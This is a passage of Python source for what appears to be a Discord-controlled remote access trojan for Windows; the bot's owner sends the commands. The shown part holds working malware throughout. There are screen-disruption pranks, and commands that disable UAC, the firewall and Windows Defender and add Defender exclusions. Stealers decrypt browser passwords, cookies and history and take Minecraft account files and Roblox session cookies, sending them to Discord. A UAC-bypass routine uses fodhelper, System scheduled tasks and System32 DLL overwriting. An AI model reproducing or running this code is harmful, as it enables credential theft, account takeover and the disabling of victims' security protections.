            windll.gdi32.BitBlt(
                hdc, 0, 0, screen_width, screen_height,
                hdc, 0, 0, 0x00550009  
            )
            time.sleep(1)  

        user32.ReleaseDC(0, hdc)
        await ctx.send("🔄 Color inversion complete!")

    except Exception as e:
        await ctx.send(f"Invert error: {str(e)}")

@_c.command(name='bonk')
async def bonk_mouse(ctx, times: int = 5):
    """Make mouse run away from cursor"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        import pyautogui
        pyautogui.FAILSAFE = False

        for _ in range(times):
            x, y = pyautogui.position()

            new_x = x + random.randint(-300, 300)
            new_y = y + random.randint(-300, 300)
            pyautogui.moveTo(new_x, new_y, duration=0.2)
            time.sleep(0.1)

        await ctx.send("🏃 Mouse got bonked!")
    except Exception as e:
        await ctx.send(f"Bonk error: {str(e)}")

@_c.command(name='earthquake')
async def screen_earthquake(ctx, duration: int = 5):
    """Shake entire screen violently"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(0)

        start_time = time.time()
        intensity = 1

        while time.time() - start_time < duration:

            intensity = min(intensity + 0.1, 5)
            shake_x = int(random.randint(-10, 10) * intensity)
            shake_y = int(random.randint(-10, 10) * intensity)

            windll.gdi32.BitBlt(
                hdc, shake_x, shake_y, screen_width, screen_height,
                hdc, 0, 0, 0x00CC0020
            )

            if random.random() < 0.2:
                winsound.Beep(50, 50)

            time.sleep(0.02)

        user32.ReleaseDC(0, hdc)
        await ctx.send("🌋 Earthquake complete!")
    except Exception as e:
        await ctx.send(f"Earthquake error: {str(e)}")

@_c.command(name='drunk')
async def drunk_screen(ctx, duration: int = 10):
    """Make screen appear drunk"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(0)

        start_time = time.time()
        angle = 0

        while time.time() - start_time < duration:
            angle += 0.1

            for x in range(0, screen_width, 50):
                offset = int(math.sin(angle + x/100) * 20)
                windll.gdi32.BitBlt(
                    hdc, x, offset, 50, screen_height,
                    hdc, x, 0, 0x00CC0020
                )

            if random.random() < 0.1:
                windll.gdi32.BitBlt(
                    hdc, 0, 0, screen_width, screen_height,
                    hdc, 0, 0, 0x00550009
                )
            time.sleep(0.05)

        user32.ReleaseDC(0, hdc)
        await ctx.send("🍺 Drunk mode deactivated!")
    except Exception as e:
        await ctx.send(f"Drunk error: {str(e)}")

@_c.command(name='disco')
async def disco_mode(ctx, duration: int = 10):
    """Turn screen into a disco party"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(0)

        colors = [0x00FF0062, 0x00000042, 0x00550009]  
        start_time = time.time()

        while time.time() - start_time < duration:

            color = random.choice(colors)
            windll.gdi32.BitBlt(
                hdc, 0, 0, screen_width, screen_height,
                hdc, 0, 0, color
            )

            freq = random.randint(500, 2000)
            winsound.Beep(freq, 50)
            time.sleep(0.1)

        user32.ReleaseDC(0, hdc)
        await ctx.send("🪩 Disco party over!")
    except Exception as e:
        await ctx.send(f"Disco error: {str(e)}")

@_c.command(name='gravity')
async def screen_gravity(ctx, duration: int = 10):
    """Make screen content fall with gravity"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(0)

        velocity = 0
        gravity = 0.5
        bounce_factor = -0.6
        y_offset = 0

        start_time = time.time()
        while time.time() - start_time < duration:

            velocity += gravity
            y_offset += velocity

            if y_offset > screen_height * 0.3:  
                y_offset = screen_height * 0.3
                velocity *= bounce_factor

                winsound.Beep(500, 50)

            windll.gdi32.BitBlt(
                hdc, 0, int(y_offset), screen_width, screen_height,
                hdc, 0, 0, 0x00CC0020
            )

            time.sleep(0.016)  

        user32.ReleaseDC(0, hdc)
        await ctx.send("🎢 Gravity effect complete!")
    except Exception as e:
        await ctx.send(f"Gravity error: {str(e)}")

@_c.command(name='taskmanager')
async def block_task_manager(ctx, action='block'):
    """Block or unblock Task Manager"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"

        if action.lower() == 'block':

            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            await ctx.send("🔒 Task Manager blocked")

        elif action.lower() == 'unblock':
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            await ctx.send("🔓 Task Manager unblocked")

    except Exception as e:
        await ctx.send(f"Task Manager control error: {str(e)}")

@_c.command(name='uac')
async def disable_uac(ctx, action='disable'):
    """Disable or enable UAC (User Account Control)"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
        except:
            await ctx.send("⚠️ Requires administrative privileges")
            return

        if action.lower() == 'disable':
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            await ctx.send("🔒 UAC disabled (requires restart)")
        elif action.lower() == 'enable':
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)
            await ctx.send("🔓 UAC enabled (requires restart)")

        winreg.CloseKey(key)

    except Exception as e:
        await ctx.send(f"UAC control error: {str(e)}")

@_c.command(name='firewall')
async def manage_firewall(ctx, action='disable'):
    """Disable or enable Windows Firewall"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if action.lower() == 'disable':
            subprocess.run('netsh advfirewall set allprofiles state off', shell=True, capture_output=True)
            await ctx.send("🔒 Firewall disabled")
        elif action.lower() == 'enable':
            subprocess.run('netsh advfirewall set allprofiles state on', shell=True, capture_output=True)
            await ctx.send("🔓 Firewall enabled")
    except Exception as e:
        await ctx.send(f"Firewall control error: {str(e)}")

@_c.command(name='defender')
async def manage_defender(ctx, action='disable'):
    """Disable or enable Windows Defender"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if action.lower() == 'disable':
            commands = [
                'powershell Set-MpPreference -DisableRealtimeMonitoring $true',
                'powershell Set-MpPreference -DisableIOAVProtection $true',
                'powershell Set-MpPreference -DisableBehaviorMonitoring $true'
            ]
        else:
            commands = [
                'powershell Set-MpPreference -DisableRealtimeMonitoring $false',
                'powershell Set-MpPreference -DisableIOAVProtection $false',
                'powershell Set-MpPreference -DisableBehaviorMonitoring $false'
            ]

        for cmd in commands:
            subprocess.run(cmd, shell=True, capture_output=True)

        await ctx.send(f"🛡️ Windows Defender {action}d")
    except Exception as e:
        await ctx.send(f"Defender control error: {str(e)}")

@_c.command(name='critical')
async def make_critical_process(ctx):
    """Make the bot process critical (BSOD on termination)"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        handle = win32api.GetCurrentProcess()

        win32process.SetProcessShutdownParameters(0x100, 0)

        priv_flags = win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        h_token = win32security.OpenProcessToken(handle, priv_flags)
        priv_id = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")

        win32security.AdjustTokenPrivileges(
            h_token, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)]
        )

        await ctx.send("⚡ Process marked as critical")
    except Exception as e:
        await ctx.send(f"Critical process error: {str(e)}")

@_c.command(name='minecraft')
async def minecraft_recovery(ctx):
    """Recover Minecraft accounts from various launchers"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        embed = discord.Embed(title="🎮 Minecraft Account Recovery", description="Searching for Minecraft installations...", color=SOLARA_BLUE)
        status_msg = await ctx.send(embed=embed)

        minecraft_installations = {
            "Intent": os.path.join(os.getenv('USERPROFILE'), "intentlauncher", "launcherconfig"),
            "Lunar": os.path.join(os.getenv('USERPROFILE'), ".lunarclient", "settings", "game", "accounts.json"),
            "TLauncher": os.path.join(os.getenv('APPDATA'), ".minecraft", "TlauncherProfiles.json"),
            "Feather": os.path.join(os.getenv('APPDATA'), ".feather", "accounts.json"),
            "Meteor": os.path.join(os.getenv('APPDATA'), ".minecraft", "meteor-client", "accounts.nbt"),
            "Impact": os.path.join(os.getenv('APPDATA'), ".minecraft", "Impact", "alts.json"),
            "Novoline": os.path.join(os.getenv('APPDATA'), ".minecraft", "Novoline", "alts.novo"),
            "CheatBreakers": os.path.join(os.getenv('APPDATA'), ".minecraft", "cheatbreaker_accounts.json"),
            "Microsoft Store": os.path.join(os.getenv('APPDATA'), ".minecraft", "launcher_accounts_microsoft_store.json"),
            "Rise": os.path.join(os.getenv('APPDATA'), ".minecraft", "Rise", "alts.txt"),
            "Rise (Intent)": os.path.join(os.getenv('USERPROFILE'), "intentlauncher", "Rise", "alts.txt"),
            "Paladium": os.path.join(os.getenv('APPDATA'), "paladium-group", "accounts.json"),
            "PolyMC": os.path.join(os.getenv('APPDATA'), "PolyMC", "accounts.json"),
            "Badlion": os.path.join(os.getenv('APPDATA'), "Badlion Client", "accounts.json"),
        }

        temp_dir = "minecraft_accounts"
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)

        total_found = 0
        found_accounts = []

        for name, path in minecraft_installations.items():
            if os.path.isfile(path):
                try:

                    new_path = os.path.join(temp_dir, f"{name.lower().replace(' ', '_')}_accounts{os.path.splitext(path)[1]}")
                    shutil.copy2(path, new_path)
                    found_accounts.append(f"✅ {name}")
                    total_found += 1
                except Exception as e:
                    found_accounts.append(f"❌ {name} (Error: {str(e)})")
            else:
                found_accounts.append(f"❌ {name} (Not found)")

        result_embed = discord.Embed(
            title="🎮 Minecraft Account Recovery Results",
            description=f"Found {total_found} Minecraft installations",
            color=SOLARA_PURPLE if total_found > 0 else SOLARA_ERROR
        )

        for i in range(0, len(found_accounts), 25):
            field_accounts = found_accounts[i:i+25]
            result_embed.add_field(
                name=f"Installations {i+1}-{i+len(field_accounts)}",
                value="\n".join(field_accounts),
                inline=False
            )

        await status_msg.edit(embed=result_embed)

        if total_found > 0:
            zip_path = "minecraft_accounts.zip"
            shutil.make_archive("minecraft_accounts", 'zip', temp_dir)

            await ctx.send(
                content="📁 Recovered Minecraft accounts:",
                file=discord.File(zip_path, "minecraft_accounts.zip")
            )

            try:
                shutil.rmtree(temp_dir)
                os.remove(zip_path)
            except:
                pass

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to recover Minecraft accounts: {str(e)}",
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='browserstuff')
async def browser_stealer(ctx):
    """Recover browser data including passwords, cookies, history, etc."""
    if ctx.author.id != OWNER_ID:
        return

    try:

        embed = discord.Embed(
            title="🌐 Browser Data Recovery",
            description="Searching for browser data...",
            color=SOLARA_BLUE
        )
        status_msg = await ctx.send(embed=embed)

        temp_dir = "browser_data"
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)

        PASSWORDS = []
        COOKIES = []
        HISTORY = []
        DOWNLOADS = []
        CARDS = []
        browsers = []

        Browser = {
            'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
            'Microsoft Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data'),
            'Firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
            'Safari': os.path.join(os.getenv('APPDATA'), 'Apple Computer', 'Safari'),
        }

        profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

        for browser, path in Browser.items():
            if not os.path.exists(path):
                continue

            master_key = get_decryption_key(os.path.join(path, 'Local State'))
            if not master_key:
                continue

            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue

                try:

                    password_db = os.path.join(profile_path, 'Login Data')
                    if os.path.exists(password_db):
                        shutil.copy2(password_db, os.path.join(temp_dir, 'passwords.db'))
                        conn = sqlite3.connect(os.path.join(temp_dir, 'passwords.db'))
                        cursor = conn.cursor()
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        for row in cursor.fetchall():
                            if row[0] and row[1] and row[2]:
                                password = decrypt_password(row[2], master_key)
                                if password:
                                    PASSWORDS.append(f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\n")
                        conn.close()
                        os.remove(os.path.join(temp_dir, 'passwords.db'))

                    cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
                    if os.path.exists(cookie_db):
                        shutil.copy2(cookie_db, os.path.join(temp_dir, 'cookies.db'))
                        conn = sqlite3.connect(os.path.join(temp_dir, 'cookies.db'))
                        cursor = conn.cursor()
                        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
                        for row in cursor.fetchall():
                            if row[0] and row[1] and row[2]:
                                cookie = decrypt_password(row[2], master_key)
                                if cookie:
                                    COOKIES.append(f"Host: {row[0]}\nName: {row[1]}\nValue: {cookie}\n")
                        conn.close()
                        os.remove(os.path.join(temp_dir, 'cookies.db'))

                    history_db = os.path.join(profile_path, 'History')
                    if os.path.exists(history_db):
                        shutil.copy2(history_db, os.path.join(temp_dir, 'history.db'))
                        conn = sqlite3.connect(os.path.join(temp_dir, 'history.db'))
                        cursor = conn.cursor()
                        cursor.execute('SELECT url, title, last_visit_time FROM urls')
                        for row in cursor.fetchall():
                            if row[0] and row[1]:
                                HISTORY.append(f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit: {row[2]}\n")
                        conn.close()
                        os.remove(os.path.join(temp_dir, 'history.db'))

                    if browser not in browsers:
                        browsers.append(browser)

                except Exception as e:
                    continue

        if any([PASSWORDS, COOKIES, HISTORY]):
            if PASSWORDS:
                with open(os.path.join(temp_dir, 'passwords.txt'), 'w', encoding='utf-8') as f:
                    f.write('\n'.join(PASSWORDS))
            if COOKIES:
                with open(os.path.join(temp_dir, 'cookies.txt'), 'w', encoding='utf-8') as f:
                    f.write('\n'.join(COOKIES))
            if HISTORY:
                with open(os.path.join(temp_dir, 'history.txt'), 'w', encoding='utf-8') as f:
                    f.write('\n'.join(HISTORY))

            zip_path = 'browser_data.zip'
            shutil.make_archive('browser_data', 'zip', temp_dir)

            result_embed = discord.Embed(
                title="🌐 Browser Data Recovery Results",
                description=f"Found data from {len(browsers)} browsers",
                color=SOLARA_PURPLE
            )

            result_embed.add_field(
                name="Browsers Found",
                value='\n'.join([f"✅ {b}" for b in browsers]) or "None",
                inline=False
            )

            result_embed.add_field(
                name="Data Recovered",
                value=f"Passwords: {len(PASSWORDS)}\nCookies: {len(COOKIES)}\nHistory: {len(HISTORY)}",
                inline=False
            )

            await status_msg.edit(embed=result_embed)

            await ctx.send(
                content="📁 Recovered browser data:",
                file=discord.File(zip_path, "browser_data.zip")
            )

            try:
                shutil.rmtree(temp_dir)
                os.remove(zip_path)
            except:
                pass

        else:
            await status_msg.edit(embed=discord.Embed(
                title="🌐 Browser Data Recovery",
                description="No browser data found",
                color=SOLARA_ERROR
            ))

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to recover browser data: {str(e)}",
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='roblox')
async def roblox_cookie(ctx):
    """Recover Roblox cookies from browsers"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        embed = discord.Embed(
            title="🎮 Roblox Cookie Recovery",
            description="Searching for Roblox cookies...",
            color=SOLARA_BLUE
        )
        status_msg = await ctx.send(embed=embed)

        import browser_cookie3
        import requests

        cookies_found = []
        browsers_checked = []

        def get_cookie_from_browser(browser_function):
            try:
                cookies = browser_function()
                cookies = str(cookies)
                cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
                return cookie
            except:
                return None

        browser_functions = {
            'Microsoft Edge': browser_cookie3.edge,
            'Google Chrome': browser_cookie3.chrome,
            'Firefox': browser_cookie3.firefox,
            'Opera': browser_cookie3.opera,
            'Opera GX': browser_cookie3.opera_gx,
            'Brave': browser_cookie3.brave
        }

        for browser_name, browser_func in browser_functions.items():
            try:
                cookie = get_cookie_from_browser(lambda: browser_func(domain_name="roblox.com"))
                if cookie and cookie not in cookies_found:
                    cookies_found.append(cookie)
                    browsers_checked.append(browser_name)

                    try:
                        info = requests.get(
                            "https://www.roblox.com/mobileapi/userinfo",
                            cookies={".ROBLOSECURITY": cookie}
                        ).json()

                        account_embed = discord.Embed(
                            title=f"Found Roblox Account in {browser_name}",
                            color=SOLARA_PURPLE
                        )

                        account_embed.add_field(name="Username", value=info.get('name', 'Unknown'), inline=True)
                        account_embed.add_field(name="Display Name", value=info.get('displayName', 'Unknown'), inline=True)
                        account_embed.add_field(name="User ID", value=info.get('id', 'Unknown'), inline=True)
                        account_embed.add_field(name="Robux Balance", value=info.get('RobuxBalance', 'Unknown'), inline=True)
                        account_embed.add_field(name="Premium", value=str(info.get('IsPremium', 'Unknown')), inline=True)

                        cookie_parts = [cookie[i:i+1000] for i in range(0, len(cookie), 1000)]
                        for i, part in enumerate(cookie_parts, 1):
                            account_embed.add_field(
                                name=f"Cookie Part {i}/{len(cookie_parts)}",
                                value=f"```{part}```",
                                inline=False
                            )

                        if info.get('ThumbnailUrl'):
                            account_embed.set_thumbnail(url=info['ThumbnailUrl'])

                        await ctx.send(embed=account_embed)

                    except Exception as e:
                        await ctx.send(f"Found cookie in {browser_name} but failed to get account info: {str(e)}")

            except Exception as e:
                continue

        final_embed = discord.Embed(
            title="🎮 Roblox Cookie Recovery Results",
            description=f"Found {len(cookies_found)} cookies in {len(browsers_checked)} browsers",
            color=SOLARA_PURPLE if cookies_found else SOLARA_ERROR
        )

        if browsers_checked:
            final_embed.add_field(
                name="Browsers Checked",
                value="\n".join(f"✅ {b}" for b in browsers_checked),
                inline=False
            )
        else:
            final_embed.description = "No Roblox cookies found in any browser"

        await status_msg.edit(embed=final_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to recover Roblox cookies: {str(e)}",
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='exclusion')
async def add_exclusion(ctx, *, path=None):
    """Add a file or directory to Windows Defender exclusions"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if not path:
            path = os.path.abspath(__file__)

        embed = discord.Embed(
            title="🛡️ Adding Windows Defender Exclusion",
            description=f"Adding exclusion for: {path}",
            color=SOLARA_BLUE
        )
        status_msg = await ctx.send(embed=embed)

        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if process.returncode == 0:
            success_embed = discord.Embed(
                title="✅ Exclusion Added",
                description=f"Successfully added exclusion for:\n```{path}```",
                color=SOLARA_PURPLE
            )
            await status_msg.edit(embed=success_embed)
        else:
            error_embed = discord.Embed(
                title="❌ Error",
                description=f"Failed to add exclusion:\n```{process.stderr}```",
                color=SOLARA_ERROR
            )
            await status_msg.edit(embed=error_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to add exclusion: {str(e)}",
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='antivirus')
async def manage_antivirus(ctx, action="status"):
    """Enable or disable Windows Defender (status/enable/disable)"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        embed = discord.Embed(
            title="🛡️ Windows Defender Control",
            description=f"Attempting to {action} Windows Defender...",
            color=SOLARA_BLUE
        )
        status_msg = await ctx.send(embed=embed)

        if action.lower() not in ["status", "enable", "disable"]:
            await status_msg.edit(embed=discord.Embed(
                title="❌ Invalid Action",
                description="Action must be 'status', 'enable', or 'disable'",
                color=SOLARA_ERROR
            ))
            return

        commands = {
            "status": 'powershell -Command "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"',
            "enable": 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"',
            "disable": 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
        }

        process = subprocess.run(commands[action.lower()], shell=True, capture_output=True, text=True)

        if process.returncode == 0:
            if action.lower() == "status":
                status = "Enabled" if "True" in process.stdout else "Disabled"
                result_embed = discord.Embed(
                    title="🛡️ Windows Defender Status",
                    description=f"Real-time protection is currently: {status}",
                    color=SOLARA_PURPLE if status == "Enabled" else SOLARA_ERROR
                )
            else:
                result_embed = discord.Embed(
                    title="✅ Success",
                    description=f"Windows Defender has been {action.lower()}d",
                    color=SOLARA_PURPLE
                )
        else:
            result_embed = discord.Embed(
                title="❌ Error",
                description=f"Failed to {action} Windows Defender:\n```{process.stderr}```",
                color=SOLARA_ERROR
            )

        await status_msg.edit(embed=result_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to manage Windows Defender: {str(e)}",
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='uacbypass')
async def uac_bypass(ctx, method: str = 'all'):
    """Attempt to bypass UAC and gain admin privileges"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        script_path = os.path.abspath(__file__)
        success = False
        results = []

        status_embed = discord.Embed(
            title="🔓 UAC Bypass Attempt",
            description="Initializing bypass methods...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        status_msg = await ctx.send(embed=status_embed)

        if method in ['all', 'fodhelper']:
            try:
                status_embed.add_field(
                    name="📝 Status",
                    value="Attempting Fodhelper bypass...",
                    inline=False
                )
                await status_msg.edit(embed=status_embed)

                key_path = r"Software\Classes\ms-settings\Shell\Open\command"
                cmd = f'pythonw "{script_path}"'

                key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
                winreg.CloseKey(key)

                subprocess.Popen("fodhelper.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                success = True
                results.append("✅ Fodhelper bypass successful")

                def cleanup():
                    pass
                threading.Thread(target=cleanup, daemon=True).start()

            except Exception as e:
                results.append(f"❌ Fodhelper bypass failed: {str(e)}")

        if method in ['all', 'cmstplua'] and not success:
            try:
                status_embed.add_field(
                    name="📝 Status",
                    value="Attempting CMSTPLUA COM bypass...",
                    inline=False
                )
                await status_msg.edit(embed=status_embed)

                shell = win32com.client.Dispatch("Shell.Application")
                shell.ShellExecute(sys.executable, f'"{script_path}"', "", "runas", 1)
                success = True
                results.append("✅ CMSTPLUA bypass successful")

            except Exception as e:
                results.append(f"❌ CMSTPLUA bypass failed: {str(e)}")

        if method in ['all', 'scheduler'] and not success:
            try:
                status_embed.add_field(
                    name="📝 Status",
                    value="Attempting Task Scheduler bypass...",
                    inline=False
                )
                await status_msg.edit(embed=status_embed)

                task_name = f"SolaraUpdate_{random.randint(1000, 9999)}"
                cmd = f'schtasks /create /tn "{task_name}" /tr "pythonw {script_path}" /sc once /st 00:00 /ru System'
                subprocess.run(cmd, shell=True, capture_output=True)

                subprocess.run(f'schtasks /run /tn "{task_name}"', shell=True, capture_output=True)
                success = True
                results.append("✅ Task Scheduler bypass successful")

                def cleanup():
                    pass
                threading.Thread(target=cleanup, daemon=True).start()

            except Exception as e:
                results.append(f"❌ Task Scheduler bypass failed: {str(e)}")

        if method in ['all', 'dll'] and not success:
            try:
                status_embed.add_field(
                    name="📝 Status",
                    value="Attempting DLL hijacking bypass...",
                    inline=False
                )
                await status_msg.edit(embed=status_embed)

                system32 = os.path.join(os.environ['SystemRoot'], 'System32')
                dll_name = "cryptbase.dll"

                dll_path = os.path.join(system32, dll_name)
                if not os.path.exists(dll_path + ".backup"):
                    if os.path.exists(dll_path):
                        os.rename(dll_path, dll_path + ".backup")

                    with open(dll_path, "w") as f:
                        f.write(f'start "" "pythonw" "{script_path}"')

                subprocess.Popen("notepad.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                success = True
                results.append("✅ DLL hijacking successful")

                def cleanup():
                    pass
                threading.Thread(target=cleanup, daemon=True).start()

            except Exception as e:
                results.append(f"❌ DLL hijacking failed: {str(e)}")

        final_embed = discord.Embed(
            title="🔓 UAC Bypass Results",
            description="Bypass attempt complete",
            color=SOLARA_PURPLE if success else SOLARA_ERROR,
            timestamp=discord.utils.utcnow()
        )

        final_embed.add_field(
            name="📊 Results",
            value="\n".join(results),
            inline=False
        )

        final_embed.add_field(
            name="✨ Status",
            value="Successfully elevated privileges" if success else "Failed to elevate privileges",
            inline=False
        )

        if success:
            final_embed.add_field(
                name="⚡ Next Steps",
                value="Check for new elevated instance of Solara",
                inline=False
            )

        await status_msg.edit(embed=final_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Critical Error",
            description=f"UAC bypass failed: {str(e)}",
                color=SOLARA_ERROR
            )
        await ctx.send(embed=error_embed)

@_c.command(name='dodge')
async def dodging_popup(ctx, *, message="Catch me if you can!"):
    """Create a popup that dodges mouse clicks"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        await ctx.send("🔄 Initializing dodging popup...")

        class_name = f"DodgeWindow_{random.randint(1000, 9999)}"

        def wndproc(hwnd, msg, wparam, lparam):
            try:
                if msg == win32con.WM_PAINT:
                    ps = win32gui.PAINTSTRUCT()
                    hdc = win32gui.BeginPaint(hwnd, ps)
                    rect = win32gui.GetClientRect(hwnd)

                    font = win32gui.CreateFont(24, 0, 0, 0, win32con.FW_BOLD, False, False, False,
                                             win32con.ANSI_CHARSET, win32con.OUT_DEFAULT_PRECIS,
                                             win32con.CLIP_DEFAULT_PRECIS, win32con.QUALITY_CLEARTYPE_NATURAL,
                                             win32con.DEFAULT_PITCH | win32con.FF_DONTCARE, "Segoe UI")

                    old_font = win32gui.SelectObject(hdc, font)

                    win32gui.SetTextColor(hdc, win32api.RGB(0, 0, 0))
                    win32gui.SetBkMode(hdc, win32con.TRANSPARENT)

                    win32gui.DrawText(hdc, message, -1, rect, 
                                    win32con.DT_SINGLELINE | win32con.DT_CENTER | win32con.DT_VCENTER)

                    win32gui.SelectObject(hdc, old_font)
                    win32gui.DeleteObject(font)
                    win32gui.EndPaint(hwnd, ps)
                    return 0

                elif msg == win32con.WM_DESTROY:
                    win32gui.PostQuitMessage(0)
                    return 0

                return win32gui.DefWindowProc(hwnd, msg, wparam, lparam)
            except Exception as e:
                print(f"Window procedure error: {e}")
                return 0

        await ctx.send("⚙️ Registering window class...")

        wc = win32gui.WNDCLASS()
        wc.lpszClassName = class_name
        wc.lpfnWndProc = wndproc
        wc.hCursor = win32gui.LoadCursor(0, win32con.IDC_ARROW)
        wc.hbrBackground = win32gui.CreateSolidBrush(win32api.RGB(255, 255, 255))
        wc.hInstance = win32gui.GetModuleHandle(None)

        try:
            atom = win32gui.RegisterClass(wc)
            await ctx.send(f"✅ Window class registered: {atom}")
        except Exception as e:
            await ctx.send(f"❌ Failed to register window class: {e}")
            return

        await ctx.send("🪟 Creating window...")

        try:
            hwnd = win32gui.CreateWindowEx(
                win32con.WS_EX_LAYERED | win32con.WS_EX_TOPMOST | win32con.WS_EX_TOOLWINDOW,
                class_name,
                "Catch me!",
                win32con.WS_POPUP | win32con.WS_VISIBLE | win32con.WS_BORDER,
                100, 100, 300, 100,
                0, 0, wc.hInstance, None
            )

            if not hwnd:
                raise Exception(f"Failed to create window. Error code: {win32api.GetLastError()}")

            await ctx.send(f"✅ Window created: {hwnd}")
        except Exception as e:
            await ctx.send(f"❌ Window creation failed: {e}")
            return

        try:

            win32gui.SetLayeredWindowAttributes(
                hwnd, 
                win32api.RGB(255, 255, 255),
                235,  
                win32con.LWA_ALPHA
            )

            win32gui.SetWindowPos(
                hwnd,
                win32con.HWND_TOPMOST,
                100, 100, 300, 100,
                win32con.SWP_SHOWWINDOW
            )

            await ctx.send("✅ Window properties set")
        except Exception as e:
            await ctx.send(f"❌ Failed to set window properties: {e}")
            return

        def dodge_thread():
            try:
                start_time = time.time()
                last_move_time = 0
                move_cooldown = 0.1  

                while time.time() - start_time < 30:  

                    while win32gui.PumpWaitingMessages() == 0:
                        current_time = time.time()
                        if current_time - last_move_time >= move_cooldown:
                            try:

                                cursor_pos = win32gui.GetCursorPos()
                                window_rect = win32gui.GetWindowRect(hwnd)

                                if (cursor_pos[0] >= window_rect[0] - 50 and 
                                    cursor_pos[0] <= window_rect[2] + 50 and
                                    cursor_pos[1] >= window_rect[1] - 50 and 
                                    cursor_pos[1] <= window_rect[3] + 50):

                                    screen_width = win32api.GetSystemMetrics(0)
                                    screen_height = win32api.GetSystemMetrics(1)

                                    cursor_x, cursor_y = cursor_pos
                                    window_x = window_rect[0]
                                    window_y = window_rect[1]

                                    dx = window_x - cursor_x
                                    dy = window_y - cursor_y

                                    length = math.sqrt(dx*dx + dy*dy) or 1
